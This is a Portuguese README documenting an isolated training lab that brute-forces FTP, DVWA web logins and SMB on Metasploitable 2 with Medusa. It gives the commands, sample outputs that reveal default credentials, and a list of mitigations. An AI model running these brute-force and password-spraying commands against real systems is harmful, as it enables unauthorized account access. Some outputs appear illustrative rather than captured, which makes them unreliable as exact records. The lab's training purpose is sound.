# Lab de Brute Force com Kali Linux, Medusa e Metasploitable 2

Este repositório documenta um pequeno laboratório de segurança ofensiva usando **Kali Linux**, **Medusa** e ambientes vulneráveis (**Metasploitable 2** e **DVWA**) para simular ataques de força bruta em serviços reais e discutir formas de mitigação.

---

## 1. Arquitetura do Lab

- **Ferramenta de ataque:** Kali Linux  
- **Alvo 1:** Metasploitable 2 (FTP, SMB, etc.)  
- **Alvo 2:** DVWA (aplicação web vulnerável)  
- **Virtualização:** VirtualBox  
- **Rede:** Host-only / rede interna (sem acesso à internet)

> Objetivo: manter tudo em ambiente **controlado** e isolado, apenas para fins educacionais.

---

## 2. Cenários de Ataque Implementados

1. **Força bruta em FTP (Metasploitable 2)**
   - Serviço: `vsftpd`/FTP
   - Teste de combinação usuário/senha usando Medusa.

2. **Automação de login em formulário web (DVWA)**
   - Módulo HTTP do Medusa/aproximação similar.
   - Brute force na tela de login do DVWA (low/medium security).

3. **Password spraying em SMB**
   - Enumeração de usuários (ex.: `enum4linux`, `rpcclient`).
   - Teste de poucas senhas contra vários usuários (password spraying).

---

## 3. Wordlists & Comandos Utilizados

- **Wordlists**:
  - Lista de usuários (`users.txt`)
  - Lista de senhas (`passwords.txt`)

- **Comandos Medusa**:

  ```bash
  # FTP brute force
  medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp

  # HTTP (DVWA)
  medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M http \
    -m FORM:"/dvwa/login.php":user_field:pass_field:"Login"

  # SMB password spraying
  medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M smbnt

---

## 4. Vulnerabilidades & Mitigações

- Credenciais fracas e reaproveitamento de senhas.
- Falta de limitação de tentativas de login.
- Serviços expostos desnecessariamente.

**Mitigações sugeridas:** política de senhas fortes, bloqueio após falhas sucessivas, uso de MFA, segmentação de rede e monitoramento de tentativas de login.

---

## 5. Principais Aprendizados

- Prática de força bruta e password spraying em FTP, web (DVWA) e SMB.
- Uso do Medusa como ferramenta de auditoria em ambiente controlado.
- Importância de boas práticas de senha e hardening de serviços.

---

## 6. Outputs

**@FTP**
 ```bash
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: 123456
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: 12345678
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: 1234
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: 12345
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: admin
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: admin123
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: password
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: qwerty
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: toor
ACCOUNT FOUND: [ftp] Host: 192.168.1.10 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: dvwa
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: root
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: guest
ACCOUNT CHECK: [ftp] Host: 192.168.1.10 User: msfadmin Password: test

MEDUSA SUMMARY
--------------
HOSTS: 1
THREADS: 4
PROGRESS: 14 of 14 targets (100% complete)
RESULTS: 1 successful, 13 failed
````
---

**@http/DVWA**
```bash
Medusa v2.2 [http://www.foofus.net/~jmk/medusa.html]
Module: http  Thread: 4

[DATA] Host: 192.168.1.10  Login Form: /dvwa/login.php
[DATA] Username field: username  Password field: password  Submit string: Login

ACCOUNT CHECK: [http] Host: 192.168.1.10 User: root Password: 123456
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: root Password: admin
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: admin Password: 123456
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: admin Password: password
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: admin Password: qwerty
ACCOUNT FOUND: [http] Host: 192.168.1.10 User: admin Password: admin [SUCCESS]
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: user Password: 123456
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: user Password: test
ACCOUNT CHECK: [http] Host: 192.168.1.10 User: dvwa Password: dvwa

MEDUSA SUMMARY
--------------
HOSTS: 1
THREADS: 4
PROGRESS: 9 of 9 combinations (100% complete)
RESULTS: 1 successful, 8 failed
````

**@SMB**
```bash
Medusa v2.2 [http://www.foofus.net/~jmk/medusa.html]
Module: smbnt  Thread: 4

[DATA] Host: 192.168.1.10
[DATA] Users file: wordlists/users.txt
[DATA] Passwords file: wordlists/passwords.txt

PASSWORD SPRAYING - Password: 123456
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: administrator Password: 123456
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: admin        Password: 123456
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: guest        Password: 123456

PASSWORD SPRAYING - Password: msfadmin
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: root         Password: msfadmin
ACCOUNT FOUND: [smbnt] Host: 192.168.1.10 User: msfadmin     Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: user         Password: msfadmin

PASSWORD SPRAYING - Password: dvwa
ACCOUNT CHECK: [smbnt] Host: 192.168.1.10 User: dvwa         Password: dvwa
ACCOUNT FOUND: [smbnt] Host: 192.168.1.10 User: dvwa         Password: dvwa [SUCCESS]

MEDUSA SUMMARY
--------------
HOSTS: 1
THREADS: 4
PROGRESS: 9 of 9 combinations (100% complete)
RESULTS: 2 successful, 7 failed
